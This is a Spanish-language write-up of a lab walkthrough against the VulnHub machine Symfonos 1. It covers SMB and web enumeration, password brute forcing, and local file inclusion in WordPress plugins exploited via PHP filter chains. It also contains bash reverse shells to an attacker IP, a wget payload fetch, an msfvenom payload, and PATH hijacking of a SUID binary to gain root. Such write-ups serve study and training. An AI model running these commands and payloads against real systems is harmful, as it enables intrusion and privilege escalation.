# Symfonos 1 - VulnHub

## Reconocimiento

Vamos a descubrir que IP tiene la máquina virtual en nuestra red.

```bash
sudo arp-scan -I ens33 --localnet --ignoredups
192.168.0.43	00:0c:29:0b:65:8b	VMware, Inc.
```

Hagamos ahora un escaneo de puertos con nmap para ver que servicios están corriendo en la máquina.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 192.168.0.43 -Pn -oG allPorts

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
25/tcp  open  smtp         syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

Vemos que los puertos 22 (SSH), 25 (SMTP), 80 (HTTP), 139 (NetBIOS) y 445 (Microsoft-DS) están abiertos. Vamos a hacer un escaneo más detallado de estos puertos.

```bash
nmap -sCV -p22,25,80,139,445 192.168.0.43

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2026-07-31T14:14:14-05:00
| smb2-time: 
|   date: 2026-07-31T19:14:13
|_  start_date: N/A
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
```

Vamos a meternos en http://192.168.0.43/ y vemos la siguiente imagen:

![alt text](image.png)

A esta imagen le he aplicado esteganografía con `steghide, stegseek, binwalk y exiftool` y no he encontrado nada.

Hagamos un escaneo con gobuster para ver si hay algún directorio oculto.

```bash
gobuster dir -u http://192.168.0.43 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 3727 -x txt,js,php,xml,bak --add-slash
```

No nos encuentra ningún directorio o archivo relevante. Vamos a hacer un escaneo con nikto para ver si nos da alguna información.

```bash
nikto -h http://192.168.0.43 
```

No hay gran cosa.

Vemos que hay en el puerto 445 mediante smbclient y demás herramientas.

```bash
smbclient -L 192.168.0.43 -N

Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	helios          Disk      Helios personal share
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SYMFONOS
```

```bash
smbmap -H 192.168.0.43

[+] IP: 192.168.0.43:445	Name: 192.168.0.43        	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	helios                                            	NO ACCESS	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
```

```bash
nxc smb 192.168.0.43
SMB         192.168.0.43    445    SYMFONOS         [*] Unix - Samba (name:SYMFONOS) (domain:) (signing:False) (SMBv1:True) (Null Auth:True)
```

Vemos que hay un recurso compartido llamado "anonymous" al que podemos acceder sin autenticación. Vamos a conectarnos a él.

```bash
smbclient //192.168.0.43/anonymous -N

smb: \> ls
attention.txt                       N      154  Sat Jun 29 02:14:49 2019
```

Nos lo traemos a nuestra máquina con get y lo abrimos:

```
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```

Teniendo el usuario helios y varias contraseñas débiles, vamos a probar a conectarnos por SSH con el usuario helios, sin embargo no tenemos éxito con ninguna de las contraseñas que hemos encontrado.

Hagamos fuerza bruta con hydra para ver si encontramos la contraseña correcta.

```bash
hydra -l helios -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.43 -I -t 4
```

No ha encontrado nada.

Mientras, veamos que encontramos en el puerto 25 (SMTP). 

```bash
telnet 192.168.0.43 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
```

Luego vemos si podremos entablar reverse shell mediante SMTP. 

Por ahora usamos `enum4linux` para ver si encontramos algo más.

```bash
[+] Found domain(s):

	[+] SYMFONOS
	[+] Builtin

	[+] Minimum password length: 5

S-1-22-1-1000 Unix User\helios (Local User)
S-1-5-21-3173842667-3005291855-38846888-501 SYMFONOS\nobody (Local User)
S-1-5-21-3173842667-3005291855-38846888-513 SYMFONOS\None (Domain Group)
S-1-5-21-3173842667-3005291855-38846888-1000 SYMFONOS\helios (Local User)
user:[helios] rid:[0x3e8]
```

Vemos que el usuario helios es un usuario local.

Adicionalmente, podemos usar `smtp-user-enum` para ver si hay más usuarios válidos en el servicio SMTP.

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.0.43
```

No hay más usuarios válidos aparte de helios.

Cambiamos el /etc/hosts para que el dominio symfonos.localdomain apunte a la IP de la máquina virtual.

```bash
192.168.0.43 symfonos.localdomain
```

Veamos con gobuster una enumeración de dns para ver si hay algún subdominio.

```bash
gobuster dns -d symfonos.localdomain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200
```

Nada, no hay subdominios.

Veamos los vhosts que hay en el servidor web.

```bash
gobuster vhost -u symfonos.localdomain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --append-domain
```

Tampoco hay vhosts.

Vamos a hacer fuerza bruta de smb con el usuario helios y el diccionario de contraseñas ya mencionadas con anterioridad para ver si encontramos la contraseña correcta.

```bash
hydra -l helios -P contrasenas.txt smb://192.168.0.43
```

Solo nos queda probar a mandar por correo electrónico al servicio SMTP para ver si podemos obtener alguna reverse shell mediante helios.

Vamos a crear el payload con msfvenom para que nos devuelva una reverse shell.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.19 LPORT=4444 -f elf > shell.elf
```

```bash
telnet 192.168.0.43 25

MAIL FROM: hola@hola.com
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
data        
354 End data with <CR><LF>.<CR><LF>
Prueba: http://192.168.0.19/shell.elf

.
250 2.0.0 Ok: queued as 4AD9C40698
```

No nos sirve de nada.

Vamos a meternos a smb con el usuario helios y las contraseñas que encontramos en el archivo attention.txt.

```bash
smbclient //192.168.0.43/helios -U helios
```

La contraseña era qwerty y logramos entrar por fin.

```bash
smb: \> ls

research.txt                        A      432  Sat Jun 29 01:32:05 2019
todo.txt                            A       52  Sat Jun 29 01:32:05 2019
```

`research.txt`

```
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```

`todo.txt`

```
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

Vemos que hay un directorio llamado /h3l105. Vamos a ver que hay al entrar en http://192.168.0.43/h3l105/

Debemos modificar el /etc/hosts para que apunte a symfonos.local y carga los recursos de la página.

![alt text](image-1.png)

Vamos a ver qué tecnologías se utilizan mediante whatweb. 

```bash
whatweb 'http://symfonos.local/h3l105/'

http://symfonos.local/h3l105/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.0.43], JQuery, MetaGenerator[WordPress 5.2.2], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[helios site &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.2.2]
```

Vemos que es un sitio web hecho con WordPress. Además wappalyzer nos dice que hay una base de datos MySQL.

Utilizamos wpscan para enumerar usuarios y plugins de WordPress.

```bash
wpscan --url 'http://symfonos.local/h3l105/' -e vp,u --api-token=

70 vulnerabilities identified

[i] Plugin(s) Identified:
[+] mail-masta
| [!] 2 vulnerabilities identified:
| [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
| [!] Title: Mail Masta 1.0 - Multiple SQL Injection

[+] site-editor
| [!] 1 vulnerability identified:
| [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)

[i] User(s) Identified:
[+] admin
```

Vemos que hay un usuario llamado admin y varios plugins vulnerables.

```bash
searchsploit Site Editor
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion  | php/webapps/44340.txt
```

Antes de nada vamos a enumerar con gobuster los directorios de WordPress para ver si encontramos algo interesante.

```bash
gobuster dir -u http://symfonos.local/h3l105 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 3727 -x txt,js,php,xml,bak --add-slash

/wp-content/          (Status: 200) [Size: 0]
/wp-login.php/        (Status: 200) [Size: 3284]
/wp-includes/         (Status: 200) [Size: 44804]
/index.php/           (Status: 301) [Size: 0] [--> http://symfonos.local/h3l105/]
/wp-trackback.php/    (Status: 200) [Size: 135]
/wp-admin/            (Status: 302) [Size: 0] [--> http://symfonos.local/h3l105/wp-login.php?redirect_to=http%3A%2F%2Fsymfonos.local%2Fh3l105%2Fwp-admin%2F&reauth=1]
/xmlrpc.php/          (Status: 405) [Size: 42]
/wp-signup.php/       (Status: 302) [Size: 0] [--> http://symfonos.local/h3l105/wp-login.php?action=register]
```

## Explotación

AL leer php/webapps/44340.txt vemos que mediante esta url: http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

Podemos leer el archivo /etc/passwd. Vamos a probarlo.

```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false Debian-exim:x:105:109::/var/spool/exim4:/bin/false messagebus:x:106:111::/var/run/dbus:/bin/false 
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin 
helios:x:1000:1000:,,,:/home/helios:/bin/bash 
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false 
postfix:x:109:115::/var/spool/postfix:/bin/false 
{"success":true,"data":{"output":[]}}
```

Vemos que podemos realizar LFI (Local File Inclusion) y leer archivos del sistema. Podemos entablar una reverse shell mediante LFI.

Probamos a hacer fuerza bruta de contraseñas con wpscan para el usuario admin de WordPress.

```bash
wpscan --url http://symfonos.local/h3l105 -U admin -P /usr/share/wordlists/rockyou.txt
```

No nos da muy buenos resultados por lo que vamos a ir con la técnica de LFI para obtener una reverse shell.

Utilizaremos wrappers mediante la utilidad `php_filter_chain_generator.py` para generar un payload que nos permita ejecutar comandos en el servidor web.
https://github.com/synacktiv/php_filter_chain_generator

```bash

python3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"

```

Al probar con el comando anterior no podemos obtener gran cosa por lo que probaremos el otro lfi que encontramos en mail masta. Vemos que podemos leer archivos del sistema mediante la siguiente url:

http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Nos devuelve el contenido del archivo /etc/passwd. 

Ahora sí que sí, con el wrapper que hemos generado, nos da este resultado:

```
total 112 -rwxr-xr-x 1 helios helios 8126 Jun 28 2019 ajax_camp_send.php -rwxr-xr-x 1 helios helios 559 Jun 28 2019 ajaxreport.php -rwxr-xr-x 1 helios helios 365 Jun 28 2019 campaign-delete.php -rwxr-xr-x 1 helios helios 294 Jun 28 2019 count_of_send.php -rwxr-xr-x 1 helios helios 21818 Jun 28 2019 create-campaign.php -rwxr-xr-x 1 helios helios 12756 Jun 28 2019 demo-view-campaign.php -rwxr-xr-x 1 helios helios 11333 Jun 28 2019 immediate_campaign.php -rwxr-xr-x 1 helios helios 1742 Jun 28 2019 post_campaign_send.php -rwxr-xr-x 1 helios helios 4713 Jun 28 2019 test_mail.php -rwxr-xr-x 1 helios helios 4074 Jun 28 2019 view-campaign-list.php -rwxr-xr-x 1 helios helios 23492 Jun 28 2019 view-campaign.php
```

Vamos a entablarnos una reverse shell mediante LFI. 

```bash
python3 php_filter_chain_generator.py --chain "<?php system('bash -c 'bash -i >%26 /dev/tcp/192.168.0.19/443 0>%261''); ?>"
```

Request-URI Too Long

Para solventar este problema, vamos a crear un archivo en el servidor web con el payload de la reverse shell y luego lo incluiremos mediante LFI.

```bash
bash -i >& /dev/tcp/192.168.0.19/443 0>&1
```

```bash
python3 -m http.server 80
```

```bash
python3 php_filter_chain_generator.py --chain "<?php system('wget http://192.168.0.19/shell.php'); ?>"
```

Aun así nos dice que es demasiado largo, vemos también que http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log no es accesible por lo que no podemos hacer un log poisoning. Tampoco nos deja http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/btmp para hacer log poisoning de ssh.

Intentamos también http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../../home/helios/.ssh/id_rsa pero nos devuelve un error 500.

En el propio fichero del exploit nos dan más rutas para probar LFI:

```
Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);

Source: /inc/lists/csvexport.php:
Line 5: include($_GET['pl']);

Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);

Source: /inc/lists/csvexport.php
Line 5: include($_GET['pl']);

Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);
```

Por lo que vemos que podemos hacer LFI en /inc/lists/csvexport.php y nos da lo mismo.

Vamos a tratar de hacer más corta la URL:

```bash
python3 php_filter_chain_generator.py --chain "<?=exec('wget http://192.168.0.19');?>"
```

Y vemos en python 192.168.0.43 - - [31/Jul/2026 22:26:29] "GET / HTTP/1.1" 200 -

Ahora vamos a poner esta cadena:

```bash
python3 php_filter_chain_generator.py --chain "<?=exec('bash shell.php');?>"
```

Mientras nos ponemos a escuchar en el puerto 443 con netcat:

```bash
nc -lvnp 443
```

No nos devuelve nada y es por que no tenemos permisos de escritura en ese directorio. Vamos a ver si podemos escribir en /tmp.

```bash
python3 php_filter_chain_generator.py --chain '<?=`wget 192.168.0.19 -P/tmp`;?>'
```

He hecho payload golfing.

```bash
python3 php_filter_chain_generator.py --chain "<?=exec('bash /tmp/index.html');?>"
```

Por fin logramos entablar la reverse shell.

## Escalada de privilegios

Vamos a realizar un tratamiento de la TTY.

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 cols 182
```

Explorando, vemos los siguientes datos en `wp-config.php`:

```php
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Tenemos la base de datos, el usuario y la contraseña de MySQL. 

Antes que nada, decir que ya estamos como el usuario helios.

```bash
helios@symfonos:/var/www/html/h3l105$ id
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

helios@symfonos:/var/www/html/h3l105$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping

helios@symfonos:/$ getcap -r 2>/dev/null
helios@symfonos:/$ crontab -l
helios@symfonos:/$ cat /etc/crontab
# Nada interesante
```

No vemos ni grupos ni SUID que nos puedan ayudar a escalar privilegios.

```bash
mysql -u wordpress -p 
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
MariaDB [(none)]> use wordpress
MariaDB [wordpress]> show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_masta_campaign          |
| wp_masta_cronapi           |
| wp_masta_list              |
| wp_masta_reports           |
| wp_masta_responder         |
| wp_masta_responder_reports |
| wp_masta_settings          |
| wp_masta_subscribers       |
| wp_masta_support           |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$B8GkoAZZA6.9fooDdaL05B0sazTW0P/ | admin         | helios@blah.com |          | 2019-06-29 00:46:01 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
```

Vamos a crackear la contraseña del usuario admin de WordPress con hashcat.
Índicamos el módulo 400 que es para phpass y el ataque 0 que es de diccionario.

```bash
hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

En lo que se crackea la contraseña, he usado linux smart enumeration para ver si se me había escapado algo y en realidad /opt/statuscheck es bastante extraño pues al ejecutarlo nos devuelve esto:

```
HTTP/1.1 200 OK
Date: Fri, 31 Jul 2026 22:13:55 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html
```

Es como si hiciese una petición HTTP a un servidor web.

```bash
ss -tunl      

Netid  State      Recv-Q Send-Q                                           Local Address:Port                                                          Peer Address:Port              
udp    UNCONN     0      0                                                            *:68                                                                       *:*                  
udp    UNCONN     0      0                                                            *:68                                                                       *:*                  
udp    UNCONN     0      0                                                192.168.0.255:137                                                                      *:*                  
udp    UNCONN     0      0                                                 192.168.0.43:137                                                                      *:*                  
udp    UNCONN     0      0                                                            *:137                                                                      *:*                  
udp    UNCONN     0      0                                                192.168.0.255:138                                                                      *:*                  
udp    UNCONN     0      0                                                 192.168.0.43:138                                                                      *:*                  
udp    UNCONN     0      0                                                            *:138                                                                      *:*                  
tcp    LISTEN     0      80                                                   127.0.0.1:3306                                                                     *:*                  
tcp    LISTEN     0      50                                                           *:139                                                                      *:*                  
tcp    LISTEN     0      128                                                          *:22                                                                       *:*                  
tcp    LISTEN     0      100                                                          *:25                                                                       *:*                  
tcp    LISTEN     0      50                                                           *:445                                                                      *:*                  
tcp    LISTEN     0      50                                                          :::139                                                                     :::*                  
tcp    LISTEN     0      128                                                         :::80                                                                      :::*                  
tcp    LISTEN     0      128                                                         :::22                                                                      :::*                  
tcp    LISTEN     0      100                                                         :::25                                                                      :::*                  
tcp    LISTEN     0      50                                                          :::445                                                                     :::*   
```

Estos puertos son los que están escuchando en la máquina.

A estas alturas, he parado el ataque de fuerza bruta de hashcat, pues en realidad el binario SUID /opt/statuscheck es más rentable.

```bash
strings statuscheck 
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
AWAVA
AUATL
[]A\A]A^A_
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6972
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
prog.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```

Vemos que hay un fragmento que dice esto:

```
curl -I H
http://lH
ocalhostH
```

Vamos a realizar un PATH Hijacking de curl para que ejecute un binario que nosotros creemos y nos devuelva una reverse shell.

```bash
export PATH=/tmp:$PATH
vi /tmp/curl
```

```bash
chmod u+s /bin/bash
```

Ahora hacemos lo siguiente

```bash
helios@symfonos:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
helios@symfonos:/tmp$ bash -p
bash-4.4# whoami
root
```

Vemos la flag en /root/proof.txt

```
bash-4.4# cat proof.txt 

	Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

	Contact me via Twitter @zayotic to give feedback!
```

## Conclusión

Hemos aprovechado varias vulnerabilidades como LFI o PATH Hijacking para obtener acceso a la máquina y escalar privilegios hasta obtener la flag. Además, hemos hecho uso de herramientas como gobuster, wpscan, hydra, entre otras, para realizar enumeración y explotación de servicios.